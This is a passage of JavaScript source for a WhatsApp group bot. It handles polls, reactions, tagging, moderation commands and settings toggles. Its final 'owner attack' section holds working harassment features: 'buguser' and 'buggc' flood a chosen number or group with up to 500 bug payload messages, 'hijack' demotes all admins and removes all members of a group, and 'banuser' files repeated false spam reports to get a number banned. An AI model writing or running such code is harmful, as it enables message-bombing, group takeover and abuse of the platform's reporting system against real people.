            `╭─❏ 📊 ᴘᴏʟʟ ᴇɴᴅᴇᴅ ❏\n │ ❓ *${poll.question}*\n │ 👥 Total: ${total}\n │\n${results}\n │\n │ 🏆 Winner: *${poll.options[winIdx]}*\n ╰─────────────────`, qid)
    }

    // ── REACTIONS ─────────────────────────────────────────────
    const gifAction = Object.keys(GIF_ACTIONS).find(k => cmd === `${PREFIX}${k}`)
    if (gifAction) {
        const target = extractTarget(args[1], quotedParticipant)
        await api.sendTyping(chatId, 1)
        const url = await utils.getReactionGif(GIF_ACTIONS[gifAction])
        if (!url) return api.sendText(chatId, `${reactions[gifAction] || '✨'} @${sender} ${gifAction}s ${target ? '@' + target : 'the air'}!`, qid)
        return api.sendImage(chatId, url, `${reactions[gifAction] || '✨'} *@${sender}* ${gifAction}s${target ? ' *@' + target + '*' : ''}!`, qid)
    }

    // ── GROUP COMMANDS ────────────────────────────────────────
    if (cmd === `${PREFIX}tagall` || cmd === `${PREFIX}everyone`) {
        if (!isGroup) return api.sendText(chatId, `❌ Group only!`, qid)
        if (!isPrivileged) return api.sendText(chatId, `❌ Admins/owner only!`, qid)
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not fetch group info!`, qid)
        // Use getParticipantNumbers to filter out @lid garbage
        const numbers = getParticipantNumbers(info.participants || [])
        if (!numbers.length) return api.sendText(chatId, `❌ Could not get member list!`, qid)
        const header = `📢 *${query || 'Attention everyone!'}*\n\n`
        // Split into chunks to avoid message length limit
        let chunk = header
        for (const num of numbers) {
            chunk += `@${num} `
            if (chunk.length > 3500) {
                await api.sendText(chatId, chunk, qid)
                chunk = ''
                await sleep(500)
            }
        }
        if (chunk) await api.sendText(chatId, chunk, qid)
        return
    }
    if (cmd === `${PREFIX}hidetag` && isGroup && isPrivileged) {
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not fetch group info!`, qid)
        const numbers = getParticipantNumbers(info.participants || [])
        return api.sendText(chatId, query || numbers.map(n => `@${n}`).join(' '), qid)
    }
    if (cmd === `${PREFIX}tagadmins` || cmd === `${PREFIX}admins`) {
        if (!isGroup) return
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not fetch group info!`, qid)
        const adminNums = (info.participants || [])
            .filter(p => {
                const rank = (p.admin || p.rank || '').toLowerCase()
                return p.isAdmin || p.isSuperAdmin || rank === 'admin' || rank === 'superadmin'
            })
            .map(p => p.realNumber || api.participantToNumber(p))
            .filter(Boolean)
        if (!adminNums.length) return api.sendText(chatId, `❌ No admins found!`, qid)
        return api.sendText(chatId,
            `╭─❏ 👑 ɢʀᴏᴜᴘ ᴀᴅᴍɪɴs ❏\n │ ${adminNums.map(n=>`@${n}`).join(' ')}\n │\n │ 📢 ${query || 'Attention admins!'}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}kick` && isGroup && isPrivileged) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .kick <number> or reply to message`, qid)
        await api.removeGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
        return api.sendText(chatId, `✅ @${target} has been kicked!`, qid)
    }
    if (cmd === `${PREFIX}add` && isGroup && isPrivileged) {
        const target = extractTarget(args[1], '')
        if (!target) return api.sendText(chatId, `❌ Usage: .add <number>`, qid)
        await api.addGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
        return api.sendText(chatId, `✅ @${target} added!`, qid)
    }
    if (cmd === `${PREFIX}promote` && isGroup && isPrivileged) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .promote <number>`, qid)
        await api.promoteGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
        return api.sendText(chatId, `✅ @${target} promoted to admin!`, qid)
    }
    if (cmd === `${PREFIX}demote` && isGroup && isPrivileged) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .demote <number>`, qid)
        await api.demoteGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
        return api.sendText(chatId, `✅ @${target} demoted!`, qid)
    }
    if (cmd === `${PREFIX}mute` && isGroup && isPrivileged) {
        state.announce[chatId] = true
        return api.sendText(chatId, `🔇 Group muted! Only admins can send.`, qid)
    }
    if (cmd === `${PREFIX}unmute` && isGroup && isPrivileged) {
        state.announce[chatId] = false
        return api.sendText(chatId, `🔊 Group unmuted! Everyone can send.`, qid)
    }
    if (cmd === `${PREFIX}warn` && isGroup && isPrivileged) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .warn <number> or reply`, qid)
        if (!state.warnings) state.warnings = {}
        const key = `${chatId}_${target}`
        state.warnings[key] = (state.warnings[key] || 0) + 1
        const count = state.warnings[key]
        if (count >= 3) {
            await api.removeGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
            state.warnings[key] = 0
            return api.sendText(chatId, `🚫 @${target} *kicked* after 3 warnings!`, qid)
        }
        return api.sendText(chatId, `⚠️ *Warning ${count}/3* for @${target}\n${query || 'Follow group rules!'}\n\n_3 warnings = kick_`, qid)
    }
    if (cmd === `${PREFIX}warnings` || cmd === `${PREFIX}checkwarn`) {
        const target = extractTarget(args[1], quotedParticipant) || sender
        const count  = state.warnings?.[`${chatId}_${target}`] || 0
        return api.sendText(chatId,
            `╭─❏ ⚠️ ᴡᴀʀɴɪɴɢs ❏\n │ 👤 @${target}\n │ ⚠️ *${count}/3*\n │ ${count >= 3 ? '🚫 Next: kicked!' : count >= 1 ? '⚡ Be careful!' : '✅ Clean'}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}clearwarnings` && isPrivileged) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .clearwarnings <number>`, qid)
        if (state.warnings) state.warnings[`${chatId}_${target}`] = 0
        return api.sendText(chatId, `✅ Warnings cleared for @${target}`, qid)
    }
    if (cmd === `${PREFIX}del` && isGroup && isPrivileged) {
        const quotedMsgId = msg?.message?.extendedTextMessage?.contextInfo?.stanzaId
        if (!quotedMsgId) return api.sendText(chatId, `❌ Reply to a message with *.del* to delete it.`, qid)
        await api.deleteMessage(chatId, quotedMsgId)
        return
    }
    if (cmd === `${PREFIX}gcinfo` || cmd === `${PREFIX}groupinfo`) {
        if (!isGroup) return api.sendText(chatId, `❌ Group only!`, qid)
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
        const total   = (info.participants || []).length
        const admins  = (info.participants || []).filter(p => {
            const r = (p.admin||p.rank||'').toLowerCase()
            return p.isAdmin||p.isSuperAdmin||r==='admin'||r==='superadmin'
        }).length
        return api.sendText(chatId,
            `╭─❏ 👥 ɢʀᴏᴜᴘ ɪɴꜰᴏ ❏\n │ 📛 Name   : ${info.subject||info.name||chatId}\n │ 👥 Total  : ${total}\n │ 👑 Admins : ${admins}\n │ 🙋 Members: ${total - admins}\n │ 📅 Created: ${info.creation ? new Date(info.creation*1000).toDateString() : 'Unknown'}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}listadmins` && isGroup) {
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
        const admins = (info.participants||[]).filter(p => {
            const r = (p.admin||p.rank||'').toLowerCase()
            return p.isAdmin||p.isSuperAdmin||r==='admin'||r==='superadmin'
        })
        if (!admins.length) return api.sendText(chatId, `❌ No admins found!`, qid)
        const nums = admins.map(a => ` │ • @${a.realNumber || api.participantToNumber(a) || (a.id||'').split('@')[0]}`).join('\n')
        return api.sendText(chatId, `╭─❏ 👑 ᴀᴅᴍɪɴs (${admins.length}) ❏\n${nums}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}setgcname` && isGroup && isPrivileged) {
        if (!query) return api.sendText(chatId, `❌ Usage: .setgcname <name>`, qid)
        await api.request('patch', `/groups/${chatId}`, { name: query })
        return api.sendText(chatId, `✅ Group renamed to *${query}*`, qid)
    }
    if (cmd === `${PREFIX}grouplink` && isGroup && isPrivileged) {
        const info = await api.getGroupInfo(chatId)
        if (!info?.invite) return api.sendText(chatId, `❌ Could not get link!`, qid)
        return api.sendText(chatId, `🔗 *Invite Link*\n\nhttps://chat.whatsapp.com/${info.invite}`, qid)
    }
    if (cmd === `${PREFIX}resetlink` && isGroup && isPrivileged) {
        const res = await api.request('delete', `/groups/${chatId}/invite`)
        if (!res?.invite) return api.sendText(chatId, `❌ Failed to reset link!`, qid)
        return api.sendText(chatId, `✅ *New Link*\n\nhttps://chat.whatsapp.com/${res.invite}`, qid)
    }
    if (cmd === `${PREFIX}kickall` && isGroup && isOwner) {
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
        const members = (info.participants||[])
            .filter(p => {
                const rank = (p.admin||p.rank||'').toLowerCase()
                const num  = p.realNumber || api.participantToNumber(p)
                if (rank === 'admin' || rank === 'superadmin' || p.isAdmin || p.isSuperAdmin) return false
                if (OWNER_NUMBERS.some(o => num && num.endsWith(o) || (o && o.endsWith(num)))) return false
                return true
            })
            .map(p => (p.id || p.jid || '').includes('@s.whatsapp.net') ? (p.id||p.jid) : `${p.realNumber||api.participantToNumber(p)}@s.whatsapp.net`)
            .filter(Boolean)
        if (!members.length) return api.sendText(chatId, `⚠️ No members to kick!`, qid)
        await api.sendText(chatId, `⚡ Kicking ${members.length} members...`, qid)
        for (let i = 0; i < members.length; i += 5) {
            await api.removeGroupParticipants(chatId, members.slice(i, i+5))
            await sleep(1000)
        }
        return api.sendText(chatId, `✅ Kicked ${members.length} members.`, qid)
    }

    // ── SETTINGS ─────────────────────────────────────────────
    if (cmd === `${PREFIX}chatbot`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Admins/owner only!`, qid)
        const enable = args[1]?.toLowerCase() === 'on'
        state.chatbot[chatId] = enable
        if (state.chatbotRate[chatId]) delete state.chatbotRate[chatId]
        return api.sendText(chatId, `🤖 *Chatbot:* ${enable ? 'ON ✅\nBot replies to every message!' : 'OFF ❌\nCommands only.'}`, qid)
    }
    if (cmd === `${PREFIX}autoreply`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.autoreply[chatId] = args[1] === 'on'
        return api.sendText(chatId, `🤖 Auto Reply: *${state.autoreply[chatId] ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}antilink`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.antilink[chatId] = args[1] === 'on'
        return api.sendText(chatId, `🔗 Anti Link: *${state.antilink[chatId] ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}antispam`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.antispam[chatId] = args[1] === 'on'
        return api.sendText(chatId, `🚫 Anti Spam: *${state.antispam[chatId] ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}antibadword`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.antibadword[chatId] = args[1] === 'on'
        return api.sendText(chatId, `🤬 Anti Bad Word: *${state.antibadword[chatId] ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}antidelete`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        if (!state.antiDelete[chatId]) state.antiDelete[chatId] = {}
        state.antiDelete[chatId].enabled = args[1] === 'on'
        return api.sendText(chatId, `🗑️ Anti Delete: *${state.antiDelete[chatId].enabled ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}antighostping` || cmd === `${PREFIX}antighost`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.antiGhostPing[chatId] = args[1] === 'on'
        return api.sendText(chatId, `👻 Anti Ghost Ping: *${state.antiGhostPing[chatId] ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}autoread`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.autoread = args[1] === 'on'
        return api.sendText(chatId, `👁️ Auto Read: *${state.autoread ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}autoreact`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.autoreact = args[1] === 'on'
        return api.sendText(chatId, `❤️ Auto React: *${state.autoreact ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}autotyping`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.autotyping = args[1] === 'on'
        return api.sendText(chatId, `⌨️ Auto Typing: *${state.autotyping ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}welcome` || cmd === `${PREFIX}setwelcome`) {
        if (!isPrivileged || !isGroup) return api.sendText(chatId, `❌ Not authorized!`, qid)
        if (!state.welcome[chatId]) state.welcome[chatId] = { enabled: false, msg: '', byeMsg: '' }
        if (args[1] === 'off') { state.welcome[chatId].enabled = false; return api.sendText(chatId, `👋 Welcome: *OFF ❌*`, qid) }
        if (args[1] === 'on')  { state.welcome[chatId].enabled = true;  return api.sendText(chatId, `👋 Welcome: *ON ✅*`, qid) }
        if (query) { state.welcome[chatId].msg = query; state.welcome[chatId].enabled = true; return api.sendText(chatId, `✅ Welcome message set!\n\n_${query}_`, qid) }
        return api.sendText(chatId, `❌ Usage: .welcome on/off  or  .welcome <custom msg>`, qid)
    }
    if (cmd === `${PREFIX}goodbye` || cmd === `${PREFIX}setgoodbye`) {
        if (!isPrivileged || !isGroup) return api.sendText(chatId, `❌ Not authorized!`, qid)
        if (!state.welcome[chatId]) state.welcome[chatId] = { enabled: false, msg: '', byeMsg: '' }
        if (args[1] === 'off') { state.welcome[chatId].byeMsg = ''; return api.sendText(chatId, `👋 Goodbye: *OFF ❌*`, qid) }
        if (query) { state.welcome[chatId].byeMsg = query; state.welcome[chatId].enabled = true; return api.sendText(chatId, `✅ Goodbye message set!\n\n_${query}_`, qid) }
        return api.sendText(chatId, `❌ Usage: .goodbye <message>  or  .goodbye off`, qid)
    }
    if (cmd === `${PREFIX}announce` && isGroup && isPrivileged) {
        state.announce[chatId] = args[1] === 'on'
        return api.sendText(chatId, `📢 Announce mode: *${state.announce[chatId] ? 'ON ✅ (Admins only)' : 'OFF ❌'}*`, qid)
    }
    if (cmd === `${PREFIX}self` && isOwner) {
        state.selfMode = true
        return api.sendText(chatId, `🔒 *Self Mode ON*\nOnly owners can use the bot.`, qid)
    }
    if (cmd === `${PREFIX}public` && isOwner) {
        state.selfMode = false
        return api.sendText(chatId, `🔓 *Public Mode ON*\nEveryone can use the bot.`, qid)
    }

    // ── SUDO ──────────────────────────────────────────────────
    if (cmd === `${PREFIX}addsudo` && isOwner) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .addsudo <number>`, qid)
        if (!state.sudoUsers.includes(target)) state.sudoUsers.push(target)
        return api.sendText(chatId, `✅ @${target} added to sudo!`, qid)
    }
    if (cmd === `${PREFIX}delsudo` && isOwner) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .delsudo <number>`, qid)
        state.sudoUsers = state.sudoUsers.filter(u => u !== target)
        return api.sendText(chatId, `✅ @${target} removed from sudo!`, qid)
    }
    if (cmd === `${PREFIX}sudolist` && isOwner) {
        if (!state.sudoUsers.length) return api.sendText(chatId, `╭─❏ 🛡️ sᴜᴅᴏ ❏\n │ No sudo users.\n ╰─────────────────`, qid)
        return api.sendText(chatId,
            `╭─❏ 🛡️ sᴜᴅᴏ ᴜsᴇʀs ❏\n` +
            state.sudoUsers.map((u,i) => ` │ ${i+1}. @${u}`).join('\n') +
            `\n ╰─────────────────`, qid)
    }

    // ── OWNER ATTACK / BROADCAST ──────────────────────────────
    if (cmd === `${PREFIX}broadcast` || cmd === `${PREFIX}bc`) {
        if (!isOwner) return api.sendText(chatId, `❌ Owner only!`, qid)
        if (!query) return api.sendText(chatId, `❌ Usage: .broadcast <message>`, qid)
        await api.sendText(chatId, `📢 *Broadcasting...*`, qid)
        let sent = 0
        try {
            const res = await api.request('get', `/group/fetchAllGroups/${process.env.EVO_INSTANCE || 'tavik-bot'}`)
            const groups = Array.isArray(res) ? res : (res?.groups || [])
            for (const g of groups) {
                const gid = g.id || g.groupJid
                if (!gid) continue
                try {
                    await api.sendText(gid.includes('@') ? gid : `${gid}@g.us`,
                        `📢 *Broadcast from ${OWNER_NAME}:*\n\n${query}`)
                    sent++
                    await sleep(800)
                } catch {}
            }
        } catch {}
        return api.sendText(chatId, `✅ Broadcast sent to *${sent}* group(s)!`, qid)
    }
    if (cmd === `${PREFIX}botstatus` && isOwner) {
        const chatbotCount = Object.values(state.chatbot||{}).filter(Boolean).length
        return api.sendText(chatId,
            `╭─❏ 📊 ʙᴏᴛ sᴛᴀᴛᴜs ❏\n │ ⏳ Uptime   : ${utils.getUptime()}\n │ 🤖 Chatbots : ${chatbotCount}\n │ 🛡️ Sudo     : ${state.sudoUsers.length}\n │ ⚡ XP Users : ${Object.keys(state.xpData||{}).length}\n │ 🔐 Mode     : ${state.selfMode ? 'Self 🔒' : 'Public 🔓'}\n ╰─────────────────`, qid)
    }
    if (cmd === `${PREFIX}buguser` && isOwner) {
        const target = digits(args[1])
        if (!target) return api.sendText(chatId, `❌ Usage: .buguser <number> [count]`, qid)
        const count = Math.min(parseInt(args[2]) || 200, 500)
        const jid   = `${target}@s.whatsapp.net`
        state.floodActive[jid] = true
        await api.sendText(chatId, `🐛 Flooding *${target}*... (${count})`, qid)
        let sent = 0
        while (state.floodActive[jid] && sent < count) {
            try { await api.sendText(jid, FLOOD_PAYLOADS[sent % FLOOD_PAYLOADS.length]()); if (sent % 5 !== 0) await sleep(100); sent++ }
            catch { await sleep(200) }
        }
        state.floodActive[jid] = false
        return api.sendText(chatId, `✅ Sent *${sent}* to ${target}`, qid)
    }
    if (cmd === `${PREFIX}buggc` && isOwner) {
        if (!isGroup) return api.sendText(chatId, `❌ Use inside a group!`, qid)
        const count = Math.min(parseInt(args[1]) || 200, 500)
        state.floodActive[chatId] = true
        await api.sendText(chatId, `🐛 Flooding group... (${count})`, qid)
        let sent = 0
        while (state.floodActive[chatId] && sent < count) {
            try { await api.sendText(chatId, FLOOD_PAYLOADS[sent % FLOOD_PAYLOADS.length]()); if (sent % 5 !== 0) await sleep(100); sent++ }
            catch { await sleep(200) }
        }
        state.floodActive[chatId] = false
        return api.sendText(chatId, `✅ Sent *${sent}* messages!`, qid)
    }
    if (cmd === `${PREFIX}stopflood` && isOwner) {
        const target = digits(args[1])
        const key    = target ? `${target}@s.whatsapp.net` : chatId
        state.floodActive[key] = false
        return api.sendText(chatId, `🛑 Flood stopped!`, qid)
    }
    if (cmd === `${PREFIX}hijack` && isOwner) {
        if (!isGroup) return api.sendText(chatId, `❌ Use inside a group!`, qid)
        await api.sendText(chatId, `⚡ Hijacking...`, qid)
        try {
            const info = await api.getGroupInfo(chatId)
            if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
            const admins  = (info.participants||[]).filter(p => {
                const r = (p.admin||p.rank||'').toLowerCase()
                return p.isAdmin||p.isSuperAdmin||r==='admin'||r==='superadmin'
            }).map(p => p.id||p.jid)
            const members = (info.participants||[]).map(p => p.id||p.jid)
            if (admins.length) await api.demoteGroupParticipants(chatId, admins).catch(() => {})
            for (let i = 0; i < members.length; i += 5) {
                await api.removeGroupParticipants(chatId, members.slice(i,i+5)).catch(() => {})
                await sleep(1000)
            }
            return api.sendText(chatId, `⚡ Taken over by ${OWNER_NAME}`)
        } catch (e) { return api.sendText(chatId, `❌ Hijack failed: ${e.message}`, qid) }
    }
    if (cmd === `${PREFIX}banuser` && isOwner) {
        const target = digits(args[1])
        if (!target) return api.sendText(chatId, `❌ Usage: .banuser <number>`, qid)
        await api.sendText(chatId, `🚨 Reporting *${target}*...`, qid)
        let reported = 0
        for (let i = 0; i < 5; i++) {
            try {
                await api.request('post', '/contacts/report', { contact_id: `${target}@s.whatsapp.net`, reason: 'spam' })
                reported++
                await sleep(500)
            } catch {}
        }
        return api.sendText(chatId, `✅ *${target}* reported ${reported}/5 times!`, qid)
    }
}

module.exports = { handleCommand }
